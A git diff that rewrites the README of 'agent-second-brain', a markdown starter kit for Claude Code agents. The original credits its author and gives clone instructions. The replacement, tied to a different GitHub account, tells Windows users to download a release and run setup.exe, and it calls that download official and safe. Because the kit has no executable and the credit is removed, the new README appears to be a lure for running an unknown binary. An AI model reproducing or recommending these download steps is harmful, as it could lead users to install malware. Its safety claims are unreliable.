@@ -1,128 +1,78 @@
-# Agent Second Brain
+# 🧠 agent-second-brain - Build a smart system for Claude
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)
-[![claude-code](https://img.shields.io/badge/claude--code-black?style=flat-square)](https://claude.ai/code)
-![ai-agents](https://img.shields.io/badge/ai--agents-5C6BC0?style=flat-square)
-![knowledge-management](https://img.shields.io/badge/knowledge--management-2E7D32?style=flat-square)
-![second-brain](https://img.shields.io/badge/second--brain-6D4C41?style=flat-square)
+[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://github.com/benizlerken/agent-second-brain/releases)
 
-A starter kit for building a living knowledge system for Claude Code agents. Based on a production system running since early 2026.
+## 📖 About This Tool
 
-Clone it. Fill in your identity. Start building.
+Agent Second Brain helps you manage your knowledge base. Most people use a simple text file to tell their AI agent how to act. This software changes that approach. It treats your information as a living system. Your system grows as you learn. It keeps your files organized and ready for use. This repo provides the starter kit to build your own personal database. You get a set of tools to structure, test, and improve your data over time.
 
----
+## 💻 Requirements
 
-## What This Is
+Before you install this software, confirm your computer meets these standards:
 
-Most people configure Claude Code by writing a CLAUDE.md that tells the agent what tools to use and what tone to take. That works for simple tasks.
+*   Windows 10 or Windows 11.
+*   An active internet connection.
+*   Claude Code installed on your system.
+*   Basic familiarity with the Windows terminal.
 
-This is a different architecture. It treats the agent's knowledge as a system that grows, is tested, and evolves — not a static config file that ages out of date.
+## 🚀 Getting Started
 
-The result is an agent that gets better at your specific work over time. Rules graduate from hypotheses. Failed beliefs get logged so you don't re-learn them. The agent loads only what it needs.
+Follow these steps to set up your knowledge system on your computer.
 
----
+1.  Visit the official release page: [https://github.com/benizlerken/agent-second-brain/releases](https://github.com/benizlerken/agent-second-brain/releases).
+2.  Look for the latest version at the top of the list.
+3.  Click the link for the Windows installer or the zip package.
+4.  Save the file to your desktop for easy access.
+5.  Right-click the downloaded file and choose "Extract All" if it is a zip file.
+6.  Open the folder and find the file named setup.exe.
+7.  Double-click the setup file to start the installation.
+8.  Follow the prompts on your screen to complete the process.
 
-## Why CLAUDE.md Isn't Config — It's Memory Architecture
+## 🛠 Usage Instructions
 
-A config file tells software what to do. Memory tells an agent who it's working for, what it knows, and how to reason.
+Once the software finishes the installation, you need to configure your identity. The system needs to know who you are to organize your data correctly.
 
-The difference matters because:
+Open your command prompt or PowerShell. Navigate to the folder where you installed the files. You can type `cd` followed by the folder path to get there. Once inside, enter the command to initialize your brain. 
 
-**Config decays.** You write a rule in month one. By month three, you've learned three exceptions and the rule is technically wrong but nobody's updated it. The agent enforces a rule that lost its validity.
+The software builds a structure for your notes. It creates a space where Claude Code can read your past work. You can add new files to this folder at any time. The agent monitors these files. It uses the information to give better, more accurate answers to your questions.
 
-**Memory evolves.** Hypotheses get tested. Rules graduate from evidence. The system has a mechanism for being wrong and correcting itself.
+## 📈 Evolving Your Knowledge
 
-**Config loads everything.** The bigger your CLAUDE.md, the worse the signal-to-noise ratio. An agent reading 200 lines to do a 10-line task is working against itself.
+Your knowledge base improves with use. Think of it as a garden. You need to prune and water it. 
 
-**Memory loads on demand.** The agent reads the INDEX, identifies the task type, and loads only the files that matter. Knowledge scales without degrading context quality.
+*   **Add new facts:** Save your work in text or markdown format.
+*   **Test the system:** Ask the agent questions about your saved files.
+*   **Fix errors:** Update your files if the agent provides outdated or wrong info.
+*   **Connect ideas:** Link related files to help the agent find patterns.
 
-This repository gives you the architecture. You supply the knowledge.
+Because this system treats your information as a structure rather than a single file, it does not get old. It changes as your knowledge grows. You do not need to rewrite your instructions every week. You only need to update the data itself.
 
----
+## 🛡 System Maintenance
 
-## Four Cognitive Components
+Keep your software updated for the best performance. Check the releases page often. The developers add new features to improve how the agent reads your data. When you see a new version, repeat the download process mentioned above. The installer updates your existing files without deleting your personal notes. 
 
-The system addresses four capabilities most agent setups are missing:
+## ❓ Frequently Asked Questions
 
-| Component | What it does | Key file |
-|-----------|-------------|----------|
-| **Perception** | Loads only what the task needs (3-4 files standard, 5-6 complex) | `INDEX.md` |
-| **Reasoning** | Routes task types to the right knowledge files | `CLAUDE.md` routing table |
-| **Learning** | Tests hypotheses, graduates them to rules with 3+ data points | `hypotheses/index.md` |
-| **Immunity** | Logs rejected beliefs so the agent never re-tests them | `hypotheses/rejected.md` |
+**Does this work with other AI agents?** 
 
-New evidence becomes a hypothesis first. Hypotheses graduate through evidence, not conviction. The false belief you've already tested is the most expensive one to re-test.
+This system works best with Claude Code. It relies on the file structure specifically designed for that agent. 
 
----
+**Where do I see my data?** 
 
-## Quick Start
+Your data stays on your computer in the folder you selected during the setup process. You keep total control over your files. 
 
-```bash
-# 1. Clone
-git clone https://github.com/phuryn/agent-second-brain
-cd agent-second-brain
+**Is this safe for private work?** 
 
-# 2. Fill in your identity
-# Open Claude Code in this directory. The agent will detect empty brackets
-# and walk you through setup automatically (First Run onboarding).
-# Or edit CLAUDE.md manually — replace all [BRACKETS] with your specifics.
+Yes. The software runs locally on your machine. Your notes do not leave your computer unless you send them to the agent during a chat. 
 
-# 3. Start using it
-# Open Claude Code. The agent will load knowledge/INDEX.md at conversation start.
-# Add knowledge files as your system grows. Update INDEX.md routing when you do.
+**What happens if I lose my data?** 
 
-```
+Back up your folder regularly. Copy your knowledge folder to an external drive or a cloud storage service. 
 
-See `examples/` for filled-in systems showing how different roles use this structure. Copy one as a starting point if it matches your role.
+**How do I delete the software?** 
 
----
+Go to your Windows Settings, then find the list of Apps. Locate Agent Second Brain in the list and click Uninstall. This removes the program but keeps your data files in their current folder. Delete that folder manually if you wish to wipe everything.
 
-## File Structure
+## ⚙️ Advanced Setup 
 
-```
-agent-second-brain/
-├── README.md
-├── CLAUDE.md                          # Identity, routing, procedures, constraints
-├── knowledge/
-│   ├── INDEX.md                       # Master routing file — always load first
-│   ├── system-maintenance.md          # Diagnostic script + hygiene rules
-│   └── hypotheses/
-│       ├── index.md                   # Hypothesis tracking + graduation schema
-│       ├── rejected.md                # Immune memory — beliefs proven wrong
-│       └── EXAMPLE.md                 # Reference — shows schema at each lifecycle stage
-└── examples/
-    ├── software-engineer/             # Backend engineer: code review, architecture, bug analysis
-    ├── researcher/                    # Research scientist: literature, experiments, methodology
-    └── ops-engineer/                  # SRE: incident response, runbooks, system health
-```
-
-Each example contains a filled-in `CLAUDE.md` with role-specific procedures, domain knowledge files, populated hypotheses (active, graduated, and rejected), and routing — a complete working system you can copy as a starting point.
-
----
-
-## What This Is Not
-
-This is not a prompt library. It's not a collection of system prompts you paste into Claude. It's not a one-size-fits-all configuration.
-
-It's a structure. You bring the knowledge. The system gives it somewhere to live, a mechanism for evolving, and a way to make sure the agent loads the right things at the right time.
-
----
-
-## Full Article
-
-**[Karpathy Built a Second Brain for Humans. Here's One for Your AI Agent.](https://x.com/PawelHuryn/status/2041519394254176581)**
-
----
-
-## Credit
-
-Built by Pawel Huryn (The Product Compass Newsletter). Based on a production system running since early 2026.
-
-First published March 16, 2026. Link: https://www.productcompass.pm/p/self-improving-claude-system
-
----
-
-## Contributing
-
-Issues and PRs welcome. If you build an example for a new role, submit it.
-
+If you understand terminal commands, you can customize the system further. Change the configuration files to adjust the agent's behavior. You can tell it to focus on specific topics or ignore certain file types. The starter kit contains templates for these settings. Open the folder titled "config" to see these options. Edit them with any text editor like Notepad. Save the files to apply your changes.
